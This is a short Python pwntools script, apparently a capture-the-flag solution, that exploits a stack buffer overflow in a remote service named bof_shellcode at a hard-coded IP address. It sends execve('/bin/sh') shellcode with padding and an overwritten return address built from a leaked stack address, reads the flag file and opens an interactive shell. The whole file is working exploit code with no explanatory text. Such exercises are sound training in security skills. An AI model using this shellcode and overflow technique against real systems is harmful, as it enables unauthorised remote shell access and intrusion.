#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11002

yuan = remote(host,port)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

yuan.recvuntil('x')
ad = yuan.recvuntil('\n')

payload = shellcode + "a" * 93 +chr(int(ad[10:-1],16))+chr(int(ad[8:-3],16))+chr(int(ad[6:-5],16))+chr(int(ad[4:-7],16))+chr(int(ad[2:-9],16))+ad[:-11].decode("hex")#+chr(int(ad[:-11],16))

yuan.sendline(payload + "\x00\x00")

yuan.sendline("cat /home/bof_shellcode/flag")

yuan.interactive()
